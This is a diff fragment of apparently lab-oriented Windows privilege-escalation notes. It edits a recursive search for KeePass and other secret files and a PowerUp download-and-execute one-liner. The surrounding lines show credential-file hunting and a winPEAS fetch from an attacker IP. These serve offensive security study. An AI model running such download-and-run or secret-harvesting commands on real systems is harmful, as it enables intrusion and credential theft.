@@ -51,7 +51,7 @@ icacls <service binary path>
 
 $env:AppKey
 
-gci -Path C:\ -Include *.kdbx,*.git -File -Recurse -ErrorAction SilentlyContinue
+gci -Path C:\ -Include *.kdbx,*.hc -File -Recurse -ErrorAction SilentlyContinue
 gci -Path C:\xampp -Include *.txt,*.ini,*.yml,*.config -File -Recurse -ErrorAction SilentlyContinue
 gci -Path C:\inetpub\wwwroot -Include *.txt,*.ini,*.yml,*.config -File -Recurse -ErrorAction SilentlyContinue
 gci -Path C:\Users\ -Include *.exe,*.txt,*.rdp,*.pdf,*.xls,*.xlsx,*.xml,*.doc,*.docx,*.ps1,*.bat,*.ini,*.yml*,.config,*.sqlite -File -Recurse -ErrorAction SilentlyContinue
@@ -89,7 +89,7 @@ iwr 10.10.14.18/winPEASx64.exe -o winpeas.exe
 ```
 4. PowerUp
 ```powershell
-IEX(New-Object Net.WebClient).downloadString('http://10.10.14.18/PowerUp.ps1');Invoke-Allchecks
+IEX(New-Object Net.WebClient).downloadString('http://172.16.139.10:7070/PowerUp.ps1');Invoke-Allchecks
 ```
 5. Running the `sysinfo` command shows us that the system is of x86 bit architecture, giving us even more reason to trust the Local Exploit Suggester
 ```
